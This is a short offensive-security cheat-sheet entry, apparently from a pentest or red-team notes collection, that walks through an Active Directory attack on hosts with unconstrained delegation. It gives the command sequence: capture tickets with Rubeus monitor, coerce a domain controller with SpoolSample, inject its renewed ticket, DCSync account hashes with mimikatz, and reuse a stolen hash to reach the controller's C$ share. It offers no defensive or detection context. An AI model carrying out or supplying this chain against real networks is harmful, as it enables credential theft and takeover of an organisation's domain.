# 09.16 Unconstrained Delegation Windows Computer Accounts

> Run `Rubeus monitor`, coerce a DC via SpoolSample to capture its TGT in memory, then DCSync with the renewed ticket.

## Overview

Computers configured with unconstrained delegation cache every authenticating user's TGT in memory. Rubeus monitor captures incoming TGTs in real time. The Printer Bug (SpoolSample / printerbug.py) coerces a Domain Controller to authenticate to the compromised host, yielding DC01$'s TGT. That TGT is renewed and used for DCSync via Mimikatz, then Rubeus asktgt creates a new session as the compromised user.

## Steps

- Run Rubeus monitor /interval:5 /nowrap on the unconstrained-delegation host to watch for incoming TGTs.
- Wait for a privileged user to connect, or trigger the Printer Bug with SpoolSample.exe targeting the DC.
- Once DC01$'s TGT is received, use Rubeus renew /ticket: /ptt to inject it.
- Run mimikatz lsadump::dcsync /user:target to DCSync any account's hash.
- Use Rubeus asktgt /rc4:hash /user:target /ptt to get a live ticket for the compromised account.
- Verify access with dir \\dc01.<DOMAIN>.local\c$.
